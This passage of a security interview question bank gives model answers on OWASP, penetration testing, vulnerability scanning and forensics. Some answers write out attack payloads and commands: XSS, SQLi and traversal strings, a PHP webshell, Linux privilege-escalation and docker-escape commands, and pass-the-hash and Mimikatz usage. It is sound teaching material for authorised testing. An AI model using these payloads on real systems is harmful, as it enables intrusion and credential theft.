      { q:"How does OWASP A07 Identification and Authentication Failures manifest and how do you mitigate it?", hint:"Weak passwords, no MFA, credential stuffing, session fixation, insecure session IDs. Mitigate: MFA, account lockout, secure session management (HttpOnly, Secure, SameSite), bcrypt passwords.", answer:`Authentication failures cover a range of weaknesses in how users prove their identity and how sessions are maintained. Credential stuffing: attackers use leaked username/password lists from other breaches against your application - effective because users reuse passwords. Mitigate with MFA and by comparing new passwords against HaveIBeenPwned's API. Brute force: automated guessing of weak passwords. Mitigate with account lockout after N failures, CAPTCHA, rate limiting by IP, and minimum password complexity. Default credentials: applications deployed with admin/admin or admin/password - automate credential-change enforcement at provisioning. Session fixation: attacker provides a session ID to the victim; after the victim authenticates, the attacker uses the same session ID. Mitigate by regenerating the session ID on authentication (session.regenerate()). Insecure session IDs: short, predictable, or sequential session tokens are guessable. Use cryptographically random tokens (128+ bits). Session cookies: always set HttpOnly (prevents JS access), Secure (HTTPS only), and SameSite=Strict or Lax (prevents CSRF). Session expiration: implement absolute and idle timeouts; invalidate sessions on logout server-side (client-side cookie deletion alone is insufficient). Password storage: bcrypt (cost >= 12), scrypt, or Argon2id - never MD5, SHA1, or unsalted SHA256. MFA: TOTP (Google Authenticator, Authy) or hardware keys (FIDO2/WebAuthn) dramatically reduce account takeover risk even if passwords are compromised.` },
      { q:"How do you conduct an OWASP-based web application security assessment?", hint:"OWASP Testing Guide (OTG). Phases: information gathering, configuration testing, authentication testing, authorisation testing, input validation testing, business logic. Tools: Burp Suite, OWASP ZAP, sqlmap, nikto.", answer:`The OWASP Web Security Testing Guide (WSTG) provides a comprehensive methodology. Information Gathering (OTG-INFO): fingerprint the web server, framework, and technology stack; map all application entry points (forms, API endpoints, file uploads, WebSocket). Use Burp Suite in proxy mode to capture all requests while navigating the application. Configuration and Deployment Management Testing: check HTTP security headers (Content-Security-Policy, X-Frame-Options, HSTS, X-Content-Type-Options); test for directory listing, backup files (.bak, .old), and verbose error messages. Authentication Testing: test for username enumeration (different responses for invalid user vs wrong password), brute force susceptibility, password complexity enforcement, MFA bypass. Authorisation Testing: IDOR testing as described - access other users' resources by manipulating IDs. Verify all privileged endpoints require appropriate roles. Input Validation Testing: test every input field for XSS (><script>alert(1)</script>), SQL injection (' OR 1=1--), command injection (; ls -la), path traversal (../../etc/passwd), and SSTI ({{7*7}}). Use Burp Scanner for automated detection and manual verification. Business Logic Testing: test edge cases specific to the application - negative quantities, skipping payment steps, price manipulation. Reporting: document each finding with CVSS score, reproduction steps, proof of concept, and remediation recommendation. OWASP ZAP (open source) provides automated scanning; Burp Suite Professional adds advanced scanning and extensions.` },
      { q:"What is Content Security Policy (CSP) and how does it mitigate XSS?", hint:"CSP HTTP header instructs browser which sources are trusted for scripts, styles, images. default-src 'self'. Blocks inline scripts unless 'unsafe-inline' (avoid). nonce-based for legitimate inline scripts. report-uri for violations.", answer:`Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into pages viewed by other users, enabling session hijacking, credential theft, or malicious actions on behalf of the victim. Content Security Policy is an HTTP response header that instructs the browser to only execute scripts from specified trusted sources, dramatically reducing XSS impact. The header: Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; img-src *; style-src 'self' 'unsafe-inline'; object-src 'none'. default-src 'self' means all resource types default to same-origin only. script-src controls JavaScript sources - never include 'unsafe-inline' (allows inline scripts, defeating XSP) or 'unsafe-eval' (allows eval()). For legitimate inline scripts, use nonce-based CSP: the server generates a random nonce per request and adds it to the header (script-src 'nonce-{random}') and to each legitimate <script nonce="{random}"> tag - injected scripts without the nonce are blocked. Strict CSP (Google's recommended approach): Content-Security-Policy: script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none'. strict-dynamic trusts scripts loaded by nonce-trusted scripts, allowing dynamic script loading. report-uri /csp-report sends violation reports to your logging endpoint - deploy in report-only mode first (Content-Security-Policy-Report-Only) to identify violations before enforcing. CSP is defence-in-depth, not a substitute for output encoding.` },
    ],
    'penetration testing': [
      { q:"Walk me through the five phases of a penetration test.", hint:"Reconnaissance -> Scanning/Enumeration -> Exploitation -> Post-exploitation (privilege escalation, lateral movement, persistence) -> Reporting. Pre-engagement: scope, rules of engagement, legal authorisation.", answer:`A penetration test follows a structured methodology to simulate a real attack within agreed boundaries. Pre-engagement: before testing begins, define the scope (IP ranges, domains, applications in-scope), rules of engagement (testing hours, prohibited actions like DoS, escalation path if critical system is destabilised), and obtain written authorisation. Never test without a signed Statement of Work or penetration test authorisation letter. Phase 1 - Reconnaissance: passive intel gathering without touching the target. OSINT (Open Source Intelligence): WHOIS records, DNS enumeration (sublist3r, amass), certificate transparency logs (crt.sh), LinkedIn for employee names/roles/tech stack, Shodan for exposed services, Google dorks. Active recon begins network interaction and may be logged. Phase 2 - Scanning and Enumeration: discover live hosts (nmap -sn), open ports (nmap -sV -sC), service versions, OS fingerprinting. Enumerate services: SMB shares (smbclient), SNMP community strings, web application directories (gobuster, feroxbuster). Phase 3 - Exploitation: leverage discovered vulnerabilities to gain initial access. Phase 4 - Post-exploitation: escalate privileges (local privesc), move laterally to other systems (pass-the-hash, pass-the-ticket), establish persistence (scheduled tasks, backdoors), and achieve the objective (data exfiltration, domain admin). Phase 5 - Reporting: document all findings, reproduction steps, CVSS scores, and prioritised remediation.` },
      { q:"How do you conduct OSINT reconnaissance on a target organisation?", hint:"Passive recon: no direct contact with target. DNS (amass, subfinder, dnsx). Certificate transparency (crt.sh). Shodan, Censys for exposed infrastructure. LinkedIn for employees. Google dorks. theHarvester for emails.", answer:`OSINT reconnaissance collects intelligence about the target from publicly available sources without triggering IDS or appearing in target logs. DNS reconnaissance: amass enum -passive -d target.com and subfinder -d target.com enumerate subdomains from passive sources (certificate transparency, DNS datasets, search engine scraping). dnsx resolves and validates discovered subdomains. Identify IP ranges from WHOIS (whois target.com) and BGP data (BGP.he.net for ASN and CIDR blocks). Certificate transparency: crt.sh/?q=%.target.com shows all SSL certificates issued for a domain - reveals internal hostnames, staging environments, and subdomains not in DNS. Shodan and Censys index internet-facing services - search org:'Target Corp' to find all their exposed IPs, ports, service banners, and vulnerabilities. Reveals forgotten dev servers, misconfigured admin panels, and VPN gateways. Employee intelligence: LinkedIn shows employee names, roles, org structure, and technology mentions in job postings ('We use Jenkins, Kubernetes, and Vault') - reveals the internal tech stack. theHarvester -d target.com -b google,linkedin,hunter scrapes emails (useful for phishing campaigns or credential stuffing). Google dorks: site:target.com filetype:pdf, site:target.com inurl:admin, "target.com" filetype:xlsx. Pastebin and GitHub searches for accidentally committed credentials or internal URLs. WaybackMachine for historical content (old endpoints, legacy login pages).` },
      { q:"Explain the difference between black-box, grey-box, and white-box penetration testing.", hint:"Black-box: no prior knowledge, simulates external attacker. Grey-box: some knowledge (user credentials, architecture overview). White-box: full access (source code, architecture, credentials). Trade-offs: realism vs coverage.", answer:`The three penetration testing approaches differ in the information provided to the tester before engagement. Black-box testing: the tester has no prior knowledge of the target - just the scope (e.g., 'pentest target.com and its IP range'). Simulates an external attacker with no insider information. Advantages: most realistic external threat simulation; tests the full attack path from initial discovery to compromise. Disadvantages: significant time spent on reconnaissance and enumeration that may miss deep application logic flaws; expensive for the coverage achieved. Best for: external network perimeter tests, initial security assessment. Grey-box testing: the tester receives some information - typically valid user credentials (to skip authentication bypass testing and focus on authorisation), a high-level architecture overview, or knowledge of the technology stack. Simulates an insider threat, a compromised vendor account, or a phishing victim. Best balance of realism and coverage - the most common pentest type. Best for: web application assessments, API testing. White-box testing (crystal-box): the tester has full access - source code, architecture diagrams, credentials at all levels, CI/CD pipeline access. Not simulating a specific threat actor but maximising code coverage and finding the most vulnerabilities. Deepest and most thorough. Best for: pre-deployment security reviews, code audits combined with dynamic testing. Most organisations do grey-box for applications and black-box for external perimeter.` },
      { q:"How do you escalate privileges on a Linux system during a post-exploitation phase?", hint:"Sudo misconfigurations (sudo -l). SUID/SGID binaries (find / -perm -4000). Cron jobs with writable scripts. Writable /etc/passwd. Kernel exploits. PATH hijacking. Docker group membership.", answer:`Post-exploitation privilege escalation moves from a low-privilege shell to root. Systematic enumeration first - tools like LinPEAS (Linux Privilege Escalation Awesome Script) automate checks. Sudo misconfigurations: sudo -l shows what commands the user can run as root without a password. Any binary listed on GTFOBins (gtfobins.github.io) can be exploited - sudo vim can spawn a root shell with :!bash; sudo find /tmp -exec bash \; escalates via find. SUID/SGID binaries: find / -perm -4000 -type f 2>/dev/null lists binaries that run with the owner's permissions (often root). Any SUID binary on GTFOBins is exploitable. Writable cron jobs: crontab -l and /etc/cron* - if a root-owned cron job executes a script that the current user can write, append a reverse shell or privilege escalation command. /etc/passwd writable: add a new root-privilege user (openssl passwd generates a crypt hash for the password field). PATH hijacking: if a SUID binary calls system('service apache2 start') without an absolute path, create a malicious 'service' binary in a directory that appears first in PATH. Kernel exploits: uname -r identifies the kernel version; search for public exploits (exploit-db, searchsploit). Docker group: if the user is in the docker group, docker run -v /:/mnt --rm -it alpine chroot /mnt sh mounts the host root filesystem. NFS no_root_squash: if an NFS share is exported with no_root_squash, mounting it and creating a SUID binary on it allows root execution.` },
      { q:"How do you exploit a web application during a penetration test?", hint:"Enumerate: gobuster/feroxbuster for directories. Burp Suite to intercept and modify requests. Test OWASP Top 10 systematically. SQLMap for SQLi. XSS payloads. File upload bypass. LFI/RFI.", answer:`Web application exploitation starts with thorough enumeration. Directory/endpoint discovery: gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt discovers hidden endpoints, admin panels, backup files, and API routes. Burp Suite intercepts all browser traffic - use the proxy to review every request and response, then test each parameter in Repeater. Systematic OWASP Top 10 testing: for every input field and URL parameter, test XSS (><img src=x onerror=alert(1)>), SQLi (' OR 1=1-- -), command injection (; id), SSTI ({{7*7}} for Jinja2, #{7*7} for Ruby ERB). SQLMap: sqlmap -u 'https://target.com/user?id=1' --dbs automates SQL injection discovery and exploitation, including database dumping. File upload: upload a PHP webshell (<?php system($_GET['cmd']); ?>) - test content-type bypass (change MIME type to image/jpeg), extension bypass (.php5, .phtml, .php.jpg), and null byte injection. LFI (Local File Inclusion): /page?file=../../../../etc/passwd; LFI to RCE via log poisoning (inject PHP into access logs, then include the log file). Authentication bypass: try default credentials, SQLi in login (admin'--), JWT manipulation (change algorithm to 'none' or RS256 to HS256 using the public key). IDOR: systematically change numeric IDs and user-specific tokens in every request. Business logic: test order of operations, negative prices, coupon stacking, and step skipping.` },
      { q:"What is lateral movement in a penetration test and what techniques do you use?", hint:"Moving from compromised host to other systems in the network. Pass-the-hash (PTH) with NTLM. Pass-the-ticket (PTT) with Kerberos TGTs. RDP, WinRM, SMB. BloodHound for AD path analysis.", answer:`Lateral movement is the phase where an attacker uses a foothold on one system to access other systems in the network, expanding their reach toward the final objective. Pass-the-Hash (PTH): on Windows, NTLM authentication uses the password hash directly - if you extract an NTLM hash from one system (via Mimikatz lsadump::sam or secretsdump.py), you can authenticate to other systems without knowing the plaintext password. impacket's wmiexec.py, smbexec.py, and psexec.py all support PTH. Pass-the-Ticket (PTT): steal a Kerberos TGT or service ticket from memory (Mimikatz sekurlsa::tickets /export) and inject it into a new session (kerberos::ptt ticket.kirbi) to authenticate as the ticket's owner. Golden Ticket: if you have the KRBTGT hash (from domain controller compromise), forge TGTs for any user. BloodHound: ingests AD data via SharpHound collector and graphs all relationships - identifies the shortest path from a compromised user to Domain Admin by finding exploitable ACLs, group memberships, and delegation permissions. RDP: xfreerdp /u:user /pth:NTLM_HASH /v:target - RDP with hash. WinRM: evil-winrm -i target -u user -H hash for a PowerShell session. SMB: access file shares to find credentials, configuration files, scripts with hardcoded passwords. SSH key reuse: private keys found on a compromised host often unlock other servers.` },
      { q:"How do you write a professional penetration test report?", hint:"Executive summary (business risk, non-technical). Findings: title, severity (CVSS), description, reproduction steps, evidence (screenshots), business impact, remediation. Appendix: scope, methodology, tools. Risk rating matrix.", answer:`A penetration test report must serve two audiences simultaneously: executives who need business risk context and engineers who need technical remediation guidance. Structure: Executive Summary (1-2 pages): overall security posture assessment, total findings by severity (critical/high/medium/low/informational), top 3 most impactful findings in plain language, business risk framing ('An attacker with internet access could extract all customer PII within 4 hours with no prior knowledge'). Do not use technical jargon in the executive summary. Scope and Methodology: dates of testing, target systems, testing approach (black/grey/white box), methodology (OWASP WSTG, PTES), tools used, limitations (testing hours, excluded systems). Findings (bulk of the report - one section per finding): Finding Title (concise, e.g., 'SQL Injection in /api/users endpoint'); Severity (Critical/High/Medium/Low with CVSS 3.1 score and vector string); Affected Asset; Vulnerability Description (what the vulnerability is and why it exists); Reproduction Steps (step-by-step, numbered, specific - a developer should be able to reproduce it exactly); Evidence (screenshots with annotations, request/response captures from Burp Suite); Business Impact (what an attacker can achieve - data theft, authentication bypass, RCE); Remediation Recommendation (specific and actionable - not 'sanitise input' but 'replace string concatenation in /api/users/login with parameterised queries using PreparedStatement'). Sort findings by severity. Appendix: raw tool output, full target list.` },
    ],
    'vulnerability assessment': [
      { q:"What is the difference between a vulnerability assessment and a penetration test?", hint:"VA: identifies and catalogues vulnerabilities (breadth). Pentest: exploits vulnerabilities to achieve objectives (depth). VA is automated-heavy with analyst triage. Pentest is manual, goal-oriented, simulates real attacker.", answer:`These two assessments answer different questions. A vulnerability assessment asks 'what vulnerabilities exist?' - it is a comprehensive, breadth-focused survey of known weaknesses across the target environment. Typically automated scanning (Nessus, Qualys, OpenVAS) supplemented by analyst triage to remove false positives, with findings categorised by severity. The output is a list of vulnerabilities with CVSS scores and remediation recommendations. A penetration test asks 'how far can an attacker get?' - it is a goal-oriented, depth-focused simulation of an attacker attempting to achieve a specific objective (obtain domain admin, exfiltrate sensitive data, perform financial fraud). The tester chains multiple vulnerabilities together - a medium-severity misconfiguration plus an information disclosure plus a privilege escalation may together result in full domain compromise that a VA would not reveal because it evaluates each finding in isolation. Penetration testing is predominantly manual, creative, and context-dependent. When to use each: vulnerability assessments are appropriate for continuous security hygiene - monthly or quarterly scans of the entire estate to catch known CVEs before they are exploited. Penetration tests are appropriate for testing security architecture before a major release, post-breach to understand the attack path, or compliance requirements (PCI DSS, ISO 27001). Many organisations run continuous VA and annual penetration tests - they are complementary.` },
      { q:"How does CVSS scoring work and how do you use it to prioritise remediation?", hint:"CVSS 3.1: Base (AV, AC, PR, UI, S, C, I, A) -> score 0-10. Temporal: exploit maturity, remediation level. Environmental: modified base for your context. Prioritise by: CVSS + asset criticality + exploitability + business impact.", answer:`CVSS (Common Vulnerability Scoring System) 3.1 provides a standardised severity score from 0-10. The Base Score captures intrinsic vulnerability characteristics: Attack Vector (Network/Adjacent/Local/Physical - Network vulnerabilities score highest, remotely exploitable without access), Attack Complexity (Low/High - does exploitation require special conditions?), Privileges Required (None/Low/High), User Interaction (None/Required), Scope (Unchanged/Changed - can the vulnerability impact components beyond its scope?), and CIA Impact (None/Low/High for Confidentiality, Integrity, and Availability). CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H gives a perfect 10.0 - network-exploitable, no auth, no user interaction, full CIA impact. Temporal Score modifies the base for current exploit maturity (is there a public exploit?) and remediation level (is a patch available?). Environmental Score allows organisations to adjust scores for their context - a vulnerability in a database containing PII should score higher than the same vulnerability in a dev sandbox. Prioritisation in practice: CVSS alone is insufficient. Supplement with: (1) asset criticality - critical production system vs internal tool, (2) exploitability - is there a public Metasploit module or PoC? EPSS (Exploit Prediction Scoring System) predicts the probability of exploitation in the wild over 30 days - a CVSS 7.5 vulnerability with high EPSS is more urgent than a CVSS 9.0 with no known exploit. (3) business impact - financial, regulatory, reputational. CISA KEV (Known Exploited Vulnerabilities catalog) is the highest priority - if a CVE is in the KEV, it is being actively exploited and must be patched immediately.` },
      { q:"Walk me through conducting a vulnerability assessment using Nessus.", hint:"Create scan policy. Configure credentials for authenticated scan. Launch scan. Review findings: false positive triage. Export report. Prioritise critical/high by CVSS and asset criticality. Retest after remediation.", answer:`Nessus Professional is the industry-standard vulnerability scanner. Setup: create a scan policy defining which plugin families to enable (network, web application, compliance), scan performance settings (max hosts/ports per scan), and credential settings. Credentialed (authenticated) scans are dramatically more thorough than unauthenticated scans - Nessus logs into each host with SSH (Linux) or Windows credentials (SMB/WMI) and inspects installed package versions, registry keys, and local configuration. Unauthenticated scans can only identify network-exposed vulnerabilities; authenticated scans find unpatched software, local privilege escalation opportunities, and misconfigurations. Scan configuration: specify target IPs or CIDR ranges, scan type (Basic Network Scan, Advanced, Compliance), and scheduling. Launch and monitor: watch for scan errors (credential failures, connectivity issues). Results analysis: Nessus categorises findings by severity (Critical/High/Medium/Low/Info) with CVSS scores, plugin output, CVE references, and remediation text. False positive triage: banner-based detection (identifying software by its version banner) produces false positives when vendors backport security fixes without updating version strings - verify by checking installed package changelog or vendor advisory. Export reports: PDF executive summary, CSV for ticketing, or Nessus XML for import into vulnerability management platforms (Tenable.sc, Vulcan Cyber). Remediation tracking: create tickets in JIRA/ServiceNow for each critical/high finding assigned to the responsible team. Retest after remediation to confirm closure and update the risk register.` },
      { q:"What is attack surface management and how does it relate to vulnerability assessment?", hint:"ASM continuously discovers and monitors all internet-facing assets (shadow IT, acquired companies, cloud sprawl). VA assesses known assets. ASM finds unknown assets first, then VA assesses them. Tools: Censys ASM, Shodan Monitor, runZero.", answer:`Attack Surface Management (ASM) is the continuous process of discovering, inventorying, and monitoring all internet-facing assets an organisation owns or is responsible for. The problem it solves: traditional vulnerability assessments scan a known list of assets - but organisations routinely have assets they do not know about: forgotten dev servers, cloud resources spun up without IT approval (shadow IT), assets from acquired companies not yet inventoried, cloud storage buckets, and subdomains pointing to decommissioned services. An attacker using Shodan or Censys will find these assets; a VA against a known IP list will not. ASM tools (Censys ASM, Shodan Monitor, runZero, Axonius, CyCognito) continuously scan the internet from an attacker's perspective, identifying all assets that resolve to the organisation's IP ranges or respond with certificates containing the organisation's domains. They alert on new assets (a developer just exposed a Kubernetes API server), configuration changes, and newly detected vulnerabilities. ASM and VA are complementary: ASM expands the scope of what is known and monitored; VA provides deep vulnerability data for those assets. A mature programme runs ASM continuously (updating the asset inventory in near-real-time) and feeds newly discovered assets into the VA scanner automatically. The integration means no asset falls through the cracks between the 'known IT estate' and the 'unknown internet exposure'.` },
      { q:"How do you handle false positives in vulnerability scanning and build a reliable triage process?", hint:"False positive sources: banner-based detection, backported patches, version mismatch. Verification: check package changelog, vendor advisory, manual exploit attempt. Mark as exception with justification. Tune scanner plugin settings.", answer:`False positives are a significant cost in vulnerability management - every false positive wastes remediation effort and erodes team trust in the VA programme. Sources of false positives: Banner-based detection is the most common - Nessus sees Apache 2.4.49 banner and flags CVE-2021-41773 (path traversal), but the installed package on Red Hat may have a backported patch (the fix applied to their 2.4.48 package without updating the version string). The package changelog or rpm -q --changelog apache2 | head confirms. Configuration-based false positives: a scanner detects SSL 3.0 enabled because the default configuration file contains it, but the actual running service has it disabled - verify with nmap --script ssl-enum-ciphers or openssl s_client. Triage process: for each critical/high finding, verify before assigning to remediation: attempt manual exploitation in a safe environment, review the vendor advisory for the specific package version, and check the CVE description against actual product behaviour. If confirmed false positive: mark as 'Not Applicable' in the scanner with a justification note (prevents it from reappearing each scan), document the evidence. Tuning: disable plugins that consistently false-positive in your environment; configure credentialed scans to eliminate banner-based guesses. Track false positive rate as a quality metric - above 20% signals the scanner or scanning configuration needs calibration.` },
      { q:"How do you assess vulnerabilities in containerised and cloud-native environments?", hint:"Container image scanning: Trivy, Snyk Container, Clair (scan layers for CVEs). Registry scanning. Runtime: Falco for anomaly detection. K8s config: kube-bench (CIS benchmark). IAM: cloud security posture management (CSPM).", answer:`Container environments introduce new vulnerability surfaces at each layer of the stack. Container image scanning: images are built from layers, each potentially containing vulnerable OS packages and application dependencies. Trivy (Aqua Security) and Snyk Container scan images for CVEs in OS packages (Ubuntu, Alpine), language packages (npm, pip, Maven), and misconfigurations. Integrate into CI: trivy image myapp:latest fails the build if critical CVEs are found. Scan images in the registry (ECR, GCR, ACR) - AWS ECR has built-in scanning via Inspector v2, or use dedicated registry scanners. Kubernetes configuration: kube-bench runs the CIS Kubernetes Benchmark - checks API server flags, etcd encryption, RBAC configuration, network policies, and pod security standards. Common findings: anonymous authentication enabled on the API server, etcd data not encrypted at rest, overly permissive ClusterRoleBindings. Runtime security: Falco monitors kernel system calls and detects anomalous behaviour (a container writing to /etc, spawning a shell, making unexpected outbound connections). Cloud security posture: CSPM tools (AWS Security Hub, Prisma Cloud, Wiz) continuously assess cloud configuration against best practices - identifying publicly accessible S3 buckets, security groups allowing 0.0.0.0/0 on port 22, unencrypted EBS volumes, and IAM roles with excessive permissions. Infrastructure-as-Code scanning: checkov, tfsec, KICS scan Terraform and CloudFormation before deployment, catching misconfigurations before they reach production.` },
      { q:"How do you present vulnerability assessment findings to business stakeholders?", hint:"Translate CVSS scores to business impact. Risk register with business context: financial loss, regulatory fines, reputational damage. Risk-rated by asset criticality, not just CVSS. Remediation roadmap with timelines. Executive dashboard.", answer:`Business stakeholders need vulnerability information framed in business terms, not technical severity scores. Translation framework: instead of 'CVSS 9.8 SQL injection on /api/login', present 'Authentication bypass in our customer portal could allow an attacker to access any customer account without a password - potential regulatory breach notification obligation under GDPR, affecting all 500,000 customer records'. Quantify business impact where possible: regulatory fines (GDPR: up to 4% of annual turnover), breach notification costs ($150-200 per record average), reputational damage measured in customer churn. Risk register format for executives: Risk Name, Affected Business Process, Likelihood (1-5), Business Impact (1-5, financial/regulatory/reputational), Current Controls, Proposed Remediation, Remediation Cost, Residual Risk. Remediation roadmap: group findings into immediate action (critical, exploitable today, < 2 weeks), short-term (high, 1 month), medium-term (medium, 1 quarter). Map to resource requirements - which team owns the remediation, what is the estimated effort? Executive dashboard: total open vulnerabilities by severity over time (trending down = improving posture), mean time to remediate by severity, % of critical vulnerabilities remediated within SLA. Visual charts communicate more effectively than tables of CVE IDs. Avoid leading with technical details in executive presentations - start with 'here is the business risk' and offer the technical detail as supporting evidence for those who want it.` },
    ],
    'digital forensics': [
      { q:"What is the order of volatility and why does it matter in digital forensics?", hint:"Most volatile to least: CPU registers/cache -> RAM -> swap/page file -> network connections -> running processes -> disk -> removable media -> backups. Collect most volatile first before it disappears.", answer:`The order of volatility defines the sequence in which evidence should be collected, from most volatile (will be lost soonest) to least volatile. CPU registers and cache: contents are overwritten with every instruction - practically uncollectable unless the system is suspended at the exact moment of acquisition. RAM: holds running processes, decrypted encryption keys, network sockets, clipboard contents, and artefacts of recent activity. RAM is wiped on shutdown - it must be collected before powering down the system, even if that means live acquisition on a running system. On Linux: LiME (Linux Memory Extractor) is a loadable kernel module that captures RAM to a file. On Windows: DumpIt, WinPmem, FTK Imager. Swap/page file: virtual memory paged out from RAM - more persistent but may contain fragments of previously running processes. Network connections: active TCP/UDP connections, ARP cache, routing table - visible with netstat, arp -a, route print; lost when the system goes offline. Running processes and open files: ps aux, lsof, handle.exe - reveals malware processes, injected DLLs, and open network handles. Disk: the primary evidence source in most investigations. Most persistent. Removable media and backups: least volatile. Practical implication: in an incident response, do not immediately pull the power cord - capture RAM first. Only power down after RAM acquisition, and only if leaving the system running poses an unacceptable ongoing threat.` },
      { q:"How do you create a forensically sound disk image and verify its integrity?", hint:"Write blocker (hardware) to prevent accidental writes to evidence drive. dd or dcfldd for imaging. md5sum/sha256sum of source and image must match. Chain of custody documentation. FTK Imager or Guymager as alternatives.", answer:`Forensic imaging creates a bit-for-bit copy of the evidence drive, preserving deleted files, unallocated space, and filesystem metadata. Write blocker: before connecting the evidence drive, attach it through a hardware write blocker (Tableau, WiebeTech) - a physical device that passes read commands through but blocks any write commands. This ensures the evidence drive is not modified by the OS (no access time updates, no Windows Prefetch writes). Without a write blocker, evidence may be inadmissible. Imaging with dd: dd if=/dev/sdb of=/mnt/evidence/case001.dd bs=64K status=progress conv=noerror,sync - noerror continues past read errors (bad sectors), sync fills bad sectors with zeros to maintain offset consistency. dcfldd adds automatic hashing during acquisition. FTK Imager (Windows) and Guymager (Linux) provide GUI interfaces with integrated hashing and E01 format support (compressed, segmented, with case metadata). Hash verification: sha256sum /dev/sdb > source.sha256; sha256sum case001.dd > image.sha256; diff source.sha256 image.sha256 - identical hashes prove the image is a perfect copy. Any discrepancy means the image is corrupted or the evidence was modified. Document the hash values in the chain of custody form along with timestamps, examiner name, and evidence handling notes. E01 format is preferred over raw dd in most professional investigations - it stores case metadata and hash verification within the image file.` },
      { q:"What artefacts do you examine on a Windows system during a forensic investigation?", hint:"Registry hives (NTUSER.DAT, SAM, SYSTEM, SOFTWARE). Event logs (Security, System, Application). Prefetch files. LNK files. Browser history. $MFT (NTFS Master File Table). USN Journal. Shellbags.", answer:`Windows forensic artefacts provide a detailed record of system and user activity. Registry: NTUSER.DAT (per-user) contains RecentDocs, MRU lists, UserAssist (programs run with timestamps), typed URLs, and run keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence). SAM hive: local user accounts and NTLM password hashes. SYSTEM hive: USB device history (HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR), network configuration, and services. SOFTWARE hive: installed applications. Tools: Registry Explorer (Eric Zimmermann) for offline analysis. Event Logs (EVTX): Security log - Event 4624 (logon), 4625 (failed logon), 4648 (explicit logon), 4720 (user account created), 4776 (credential validation). System log - service start/stop, driver load. Application log - application errors. Parse with Timeline Explorer or EvtxECmd. Prefetch files (C:\\Windows\\Prefetch\\): Windows creates a .pf file for each executed program, containing the executable name, run count, last 8 run timestamps, and files/DLLs accessed. Evidence of execution even after the program is deleted. PECmd.exe parses prefetch. LNK files (shortcuts): created automatically when a file is opened - contain original file path, volume serial number, MAC timestamps of the original file even if it was on a network share or removed USB. LECmd.exe parses LNK files. Shellbags: registry artefacts recording folder browsing history - reveals folders accessed even on removed USB drives. $MFT: Master File Table is the NTFS filesystem index containing metadata for every file (created/modified/accessed/entry timestamps, file size, permissions). MFTECmd parses it. USN Journal: logs all file system changes chronologically.` },
      { q:"How do you perform memory forensics with Volatility?", hint:"imageinfo to identify OS profile. pslist/pstree for process listing. netscan for network connections. cmdline for process arguments. malfind for injected code. dlllist, handles. Identify parent-child anomalies and suspicious injected regions.", answer:`Volatility is the primary open-source memory forensics framework. Workflow begins with profile identification: vol.py -f memory.dump imageinfo suggests the correct OS profile (e.g., Win10x64_19041) needed for all subsequent plugins. Process analysis: pslist shows running processes in list order (can be manipulated by rootkits); psscan scans memory for EPROCESS structures directly (harder to hide from); pstree shows parent-child relationships - suspicious patterns: cmd.exe spawned by a Word document (macro execution), powershell.exe as a child of a browser (drive-by download), processes with names impersonating legitimate ones (svchost.exe running from %TEMP%). Network connections: netscan lists active and recently closed TCP/UDP connections with PID, local/remote address and port - correlate suspicious IPs with threat intelligence feeds. Process memory: cmdline shows the command line arguments for each process - reveals obfuscated PowerShell (-EncodedCommand, -ExecutionPolicy Bypass) or malware command-line patterns. malfind identifies memory regions that are executable, readable, and writeable (RWX) with no backing file on disk - a strong indicator of process injection or shellcode. dlllist shows loaded DLLs per process - look for DLLs loaded from temp directories or with missing paths. handles lists open handles (files, registry keys, mutexes) - malware often creates named mutexes as infection markers. For rootkit detection: modules/modscan compares loaded kernel modules from two sources (list walking vs pool scanning) - discrepancies indicate hidden drivers.` },
      { q:"What is chain of custody and why is it legally critical in digital forensics?", hint:"Chain of custody: documented record of who had possession of evidence, when, and what they did with it. Proves evidence was not tampered with. Court inadmissibility if chain broken. Evidence form, hash verification, sealed storage.", answer:`Chain of custody is the chronological documentation of evidence possession, handling, and analysis - proving that evidence presented in court or a legal proceeding is the same evidence collected at the scene and has not been tampered with. Legal significance: if the chain of custody is broken (undocumented gaps, missing signatures, hash mismatches), opposing counsel can argue the evidence was altered, contaminated, or substituted - potentially rendering it inadmissible. Even technically sound forensic analysis is worthless if the chain of custody cannot withstand legal scrutiny. Documentation requirements: for each piece of evidence, record: exhibit number, description (make/model/serial/capacity for drives), date and time of collection, collector's name and role, hash values (MD5 and SHA-256 of the original source and forensic image), all transfers (from scene to lab, from lab to examiner, to court). Each person who takes possession signs and dates the form. Physical controls: evidence is sealed in anti-static bags with tamper-evident tape; the seal is signed across the closure. Evidence is stored in a locked evidence locker with access logging. Digital controls: forensic images are stored read-only on evidence servers with access auditing; all analysis is performed on copies, never the original. Hash verification at each stage: when an examiner receives evidence, they hash the image before beginning analysis and verify it matches the hash recorded at acquisition. A mismatch must be investigated and documented before proceeding. In corporate investigations, even when legal proceedings are not anticipated, maintaining chain of custody protects the organisation if the situation later becomes litigious.` },
      { q:"How do you conduct log analysis in a digital forensics investigation?", hint:"Windows: Security (4624, 4625, 4648, 4688, 4698), Sysmon (process, network, registry events). Linux: /var/log/auth.log, /var/log/syslog, bash history, wtmp/utmp. Tools: ELK Stack, Splunk, Timeline Explorer, grep/awk for targeted parsing.", answer:`Log analysis reconstructs the timeline of events during an incident. Windows event logs are the primary source: Security log captures authentication (4624 logon type 3 = network, type 10 = RemoteInteractive/RDP), failed logons (4625), explicit credential use (4648 - unusual if from a service account), and process creation (4688, requires audit policy enabled and command line logging). Sysmon (System Monitor, from Microsoft Sysinternals) provides dramatically more visibility when deployed: Event ID 1 (process creation with full command line and hash), ID 3 (network connection with source/destination), ID 11 (file creation), ID 13 (registry value set). Sysmon logs should be the standard in any environment. Linux logs: /var/log/auth.log or /var/log/secure records SSH logins (Accepted password/publickey for user X from IP), sudo usage, and su commands. /var/log/syslog for system events. .bash_history in user home directories records commands (but can be deleted or disabled). wtmp/utmp: last -f /var/log/wtmp shows all logins/logouts with timestamps and source IPs. Web server logs (Apache /var/log/apache2/access.log, Nginx) reveal HTTP requests - look for 200-response POST to unexpected paths, scanning patterns (40X errors in sequence), and exploit payloads in URLs. Log aggregation with ELK Stack or Splunk enables timeline correlation across multiple systems - constructing the full attack path 